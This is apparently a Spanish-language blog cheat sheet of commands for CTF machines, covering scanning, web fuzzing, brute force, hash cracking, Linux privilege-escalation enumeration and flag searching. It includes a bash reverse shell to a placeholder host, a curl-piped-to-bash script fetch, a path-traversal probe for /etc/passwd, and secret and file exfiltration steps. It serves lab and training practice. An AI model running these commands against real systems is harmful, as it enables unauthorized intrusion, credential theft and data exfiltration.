---
title: "Comandos y apuntes para CTFs"
description: "Descripcion"
date: "2024-12-01"
tags: ["Bash"]
---


# Carpetas

```bash

MAQUINA="soulmate" # Ejemplo
mkdir -p "$MAQUINA"/{content,nmap,scripts}

```

---

# 🌐 Reconocimiento de Red

**Exportar resultados en XML y texto:**

```bash
nmap -sSCV -p- --open -T4 -Pn -n -vvv -oN escaneo_nmap.txt -oX escaneo_nmap.xml <IP>
```


**Convertir XML a HTML:**

```bash
xsltproc target.xml -o target.html
```

---

# 📁 Enumeración Web

## Directorios

```bash

# Cambiar User-Agent

gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b <NO-STATUS> -q --timeout 15s -a "Mozilla/5.0" 2>/dev/null -T 50


feroxbuster --url http://$target -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 301 --scan-dir-listings --depth 8

```

## Subdominios

```bash

gobuster dns -do <DOMINIO> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

ffuf -u http://<DOMINIO> -H "Host: FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4 -t 200 -ac

dnsrecon -d <DOMINIO> -n <IP> -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

wfuzz -c --hc=404 --hl=1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.dominio.com" -u <IP>


```

## Parámetros

```bash

wfuzz -c --hc=404 --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.<DOMINIO>" -u <IP>

wfuzz -c --hc=404 --hw 169 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 'http://<IP>/index.php?FUZZ=../../../../../../../../../etc/passwd'

# GET
ffuf -u http://<IP>/get.php?x=FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# POST
ffuf -u http://<IP>/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v

```

## Virtual Hosts

```bash

gobuster vhost -u <IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -r

```


## Inspección de headers y recursos
   
```bash

curl -s -I http://<IP>

# GET mostrando cabeceras de respuesta
curl -i https://example.com

# Mostrar solo cabeceras
curl -I https://example.com

# Seguir redirecciones
curl -L https://example.com

# Ver detalles de la transacción
curl -v https://example.com

# Deshabilitar verificación SSL
curl -k https://example.com

# Descarga sin archivos con cURL, lo ejecutamos de inmediato:

curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

```


## Revisión de JavaScript expuesto
   
```bash

wget -r http://<IP> | grep -i "api\|key\|admin" *.js
```

---

# 🛠️ Herramientas de Enumeración

## linPEAS

```bash

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
# https://github.com/The-Z-Labs/linux-exploit-suggester

```


## Hydra

```bash

hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."

```

## Reverse Shell

```bash

bash -c "bash -i>&/dev/tcp/<IP>/<PORT> 0>&1"

```


# 🖥️ Post-Explotación y TTY

**Mejorar shell TTY:**

```bash

script /dev/null -c bash

# Ctrl+Z

stty raw -echo; fg

reset xterm

stty rows 62 columns 248

export TERM=xterm

export SHELL=bash

# Otra forma

python3 -c 'import pty; pty.spawn("/bin/bash")' 


```

---

## Hoja de Ruta de Comandos CTF por Nivel de Avance

### Nivel 1: Reconocimiento Inicial Rápido (Looting Básico)

Comandos de impacto bajo y alta ganancia para establecer el contexto y el entorno.

- `whoami`
    
- `id`
    
- `hostnamectl`
    
- `uname -a`
    
- `cat /etc/os-release`
    
- `history`
    
- `echo $PATH`
    
- `env`
    
- `ip a`
    
- `ss -tulnp | grep LISTEN`
    
- `w` o `who`
    

---

### Nivel 2: Enumeración Profunda (Búsqueda de Rutas de Escalada)

Análisis de permisos, archivos críticos, servicios y posibles fallas de configuración.

- `sudo -v`
    
- `sudo -l`
    
- `sudo -V | head -n1`
    
- `grep "sh$" /etc/passwd`
    
- `getent group sudo`
    
- `cat /etc/crontab`
    
- `ps aux`
    
- `lsof -i`
    
- `env | grep -i key`
    
- `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null`
    
- `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`
    
- `ls -alR /home`
    
- `ls -la /var/backups`
    

---

### Nivel 3: Vulnerabilidades y Tácticas de Explotación

Comandos enfocados en encontrar fallas de permisos y posibles lugares para escribir _shells_.

- `find / -type f -perm -4000 -user root 2>/dev/null`
    
- `find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null` (Más completo que el anterior)
    
- `find / -writable -type d 2>/dev/null`
    
- `ls -alt /tmp`
    
- `tail -f /var/log/auth.log`
    

---

### Nivel 4: Manejo de Archivos y _Post-Explotación_

Comandos útiles para la exfiltración, transferencia o decodificación de datos una vez se ha obtenido acceso.

- `php -S 0.0.0.0:8000` (Servidor web temporal)
    
- `ruby -run -ehttpd . -p8000` (Servidor web temporal)
    
- `scp usuario@host:/ruta/archivo /ruta/local` (Descarga)
    
- `scp /ruta/archivo usuario@host:/ruta/remota` (Subida)
    
- `md5sum <ARCHIVO>`
    
- `cat <ARCHIVO> | base64 -w 0;echo` (Codificación)
    
- `echo -n '<ARCHIVO CODIFICADO BASE64>' | base64 -d > <NOMBRE NUEVO ARCHIVO>` (Decodificación)
    

---

### Nivel 5: Búsqueda de Flags (Término del CTF)

Comandos para encontrar los archivos _flag_ una vez se tienen los permisos necesarios.

- `find / -type f -name "user.txt" 2>/dev/null`
    
- `find / -type f -name "root.txt" 2>/dev/null` (Asumiendo que se busca la _root flag_)
    
- `locate user.txt`
    
- `grep -r "user.txt" / 2>/dev/null`


---



## Buscar archivos por nombre

Testear:

```bash

# Extrae la ruta del request, la decodifica y devuelve solo el valor después de "/flag = "
grep -i -m1 'flag' /var/log/apache2/access.log \
  | sed -n 's/.*GET \([^ ]*\) HTTP.*/\1/p' \
  | python3 -c "import sys,urllib.parse as u,re
s = u.unquote(sys.stdin.read().strip())
# normaliza '+' a espacio por si acaso y busca '/flag = <valor>'
s = s.replace('+',' ')
m = re.search(r'(?i)^/flag\s*=\s*(.*)', s)
print(m.group(1) if m else s)"


```

# 🔑 Cracking y Fuerza Bruta

## Local (John The Ripper)

```bash

john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash

zip2john archivo.zip > hashzip

john --wordlist=/usr/share/wordlists/rockyou.txt hashzip

keepass2john Database.kdbx > hashkeepass

john --wordlist=/usr/share/wordlists/rockyou.txt hashkeepass

```


---

# 💻 WordPress

## Enumeración y fuerza bruta

```bash

wpscan --url <DOMINIO> --enumerate u,vp --random-user-agent --force
wpscan --url <DOMINIO> --passwords rockyou.txt --usernames administracion --random-user-agent --force
wpscan --url http://<IP>/wordpress --enumerate u,vp --random-user-agent --force -o wpscan.txt
wpscan --url http://<IP>/wordpress/ --passwords /path/rockyou.txt --usernames <USER> --random-user-agent --force

```

## Comandos CURL para info

```bash
curl -s http://<DOMINIO> | grep WordPress
curl -s http://<DOMINIO>/ | grep themes
curl -s http://<DOMINIO>/ | grep plugins
curl -s http://<DOMINIO>/?p=1 | grep plugins
```

## Fuerza bruta XML-RPC

```bash

wpscan --password-attack xmlrpc -t 20 -U <USER> -P /usr/share/wordlists/rockyou.txt --url http://<DOMINIO>

```

---





